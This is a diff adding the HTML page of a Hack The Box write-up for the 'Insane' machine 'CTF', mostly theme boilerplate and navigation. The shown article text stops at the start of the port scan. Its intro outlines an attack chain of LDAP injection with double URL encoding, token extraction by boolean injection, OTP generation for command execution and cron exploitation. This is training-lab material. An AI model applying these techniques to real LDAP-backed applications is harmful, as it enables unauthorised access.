@@ -1,0 +1,1510 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>HTB - CTF &middot; squ4r00t&#39;s</title>
+    <meta name="title" content="HTB - CTF &middot; squ4r00t&#39;s">
+  
+
+  
+  
+    <meta name="description" content="Writeup for the &#39;Insane&#39; rated machine: CTF">
+  
+  
+    <meta name="keywords" content="htb,linux,insane,ldap_injection,stoken,otp_bypass,7z_privesc,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/writeups/ctf/">
+  
+
+  
+  
+    <meta name="author" content="squ4r00t">
+  
+  
+    
+      
+        
+          <link href="https://app.hackthebox.com/users/1634933" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://github.com/squ4r00t" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/writeups/ctf/">
+  <meta property="og:site_name" content="squ4r00t&#39;s">
+  <meta property="og:title" content="HTB - CTF">
+  <meta property="og:description" content="Writeup for the &#39;Insane&#39; rated machine: CTF">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-04-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-30T00:00:00+00:00">
+    <meta property="article:tag" content="Htb">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Insane">
+    <meta property="article:tag" content="Ldap_injection">
+    <meta property="article:tag" content="Stoken">
+    <meta property="article:tag" content="Otp_bypass">
+    <meta property="og:image" content="http://localhost:1313/writeups/ctf/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/writeups/ctf/cover.png">
+  <meta name="twitter:title" content="HTB - CTF">
+  <meta name="twitter:description" content="Writeup for the &#39;Insane&#39; rated machine: CTF">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+  
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8f2e3b8a451034dfde66a61afd0a9f24321c02b542e96c8947da21771dbdb289d1ee250ed7a2c1e854a9248feb86b1917c6ea7e6905770333360e8402c29c44a.css"
+    integrity="sha512-jy47ikUQNN/eZqYa/QqfJDIcArVC6WyJR9ohdx29sonR7iUO16LB6FSpJI/rhrGRfG6n5pBXcDMzYOhALCnESg==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
+      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Writeups",
+    "name": "HTB - CTF",
+    "headline": "HTB - CTF",
+    "description": "Writeup for the \u0027Insane\u0027 rated machine: CTF",
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/writeups/ctf/",
+    "author" : {
+      "@type": "Person",
+      "name": "squ4r00t"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-04-30T00:00:00\u002b00:00",
+    "datePublished": "2025-04-30T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-04-30T00:00:00\u002b00:00",
+    
+    "keywords": ["htb","linux","insane","ldap_injection","stoken","otp_bypass","7z_privesc"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1686"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      squ4r00t&rsquo;s
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/posts/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog Posts"
+      title="Posts">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog Posts
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/writeups/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Writeups"
+      title="Writeups">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Writeups
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/posts/"
+        aria-label="Blog Posts"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Posts" class="text-2xl font-bold tracking-tight">
+          Blog Posts
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/writeups/"
+        aria-label="Writeups"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Writeups" class="text-2xl font-bold tracking-tight">
+          Writeups
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB - CTF
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-04-30T00:00:00&#43;00:00">30 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1686 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      
+      
+        
+        
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="squ4r00t"
+        src="/img/00_hu_584bcd62f1b826f0.png"
+        data-zoom-src="/img/00_hu_cb61e1d8ef47edd0.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Author
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        squ4r00t
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">hackerr</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://app.hackthebox.com/users/1634933"
+          target="_blank"
+          aria-label="Hackthebox"
+          title="Hackthebox"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<!-- Uploaded to: SVG Repo, www.svgrepo.com, Transformed by: SVG Repo Mixer Tools -->
+<svg fill="#7ce85e" width="800px" height="800px" viewBox="0 0 24 24" role="img" xmlns="http://www.w3.org/2000/svg" stroke="#7ce85e" stroke-width="0.00024000000000000003">
+<g id="SVGRepo_bgCarrier" stroke-width="0"/>
+<g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"/>
+<g id="SVGRepo_iconCarrier">
+<path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/>
+</g>
+</svg></span></span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/squ4r00t"
+          target="_blank"
+          aria-label="Github"
+          title="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan-results">Port Scan Results</a></li>
+    <li><a href="#website">Website</a>
+      <ul>
+        <li><a href="#testing-for-ldap-injection">Testing for LDAP Injection</a></li>
+        <li><a href="#username-enumeration">Username enumeration</a></li>
+        <li><a href="#attribute-enumeration">Attribute enumeration</a></li>
+        <li><a href="#token-leak">Token leak</a></li>
+        <li><a href="#otp-generation">OTP Generation</a></li>
+        <li><a href="#command-execution">Command execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a>
+      <ul>
+        <li><a href="#apache---ldapuser">apache -&gt; ldapuser</a></li>
+        <li><a href="#ldapuser---root">ldapuser -&gt; root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan-results">Port Scan Results</a></li>
+    <li><a href="#website">Website</a>
+      <ul>
+        <li><a href="#testing-for-ldap-injection">Testing for LDAP Injection</a></li>
+        <li><a href="#username-enumeration">Username enumeration</a></li>
+        <li><a href="#attribute-enumeration">Attribute enumeration</a></li>
+        <li><a href="#token-leak">Token leak</a></li>
+        <li><a href="#otp-generation">OTP Generation</a></li>
+        <li><a href="#command-execution">Command execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a>
+      <ul>
+        <li><a href="#apache---ldapuser">apache -&gt; ldapuser</a></li>
+        <li><a href="#ldapuser---root">ldapuser -&gt; root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = true
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          <p>CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.</p>
+
+<h2 class="relative group">Port Scan Results
+    <div id="port-scan-results" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#port-scan-results" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>From the results of the nmap scan, we see that we have 2 ports open: 22 and 80</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
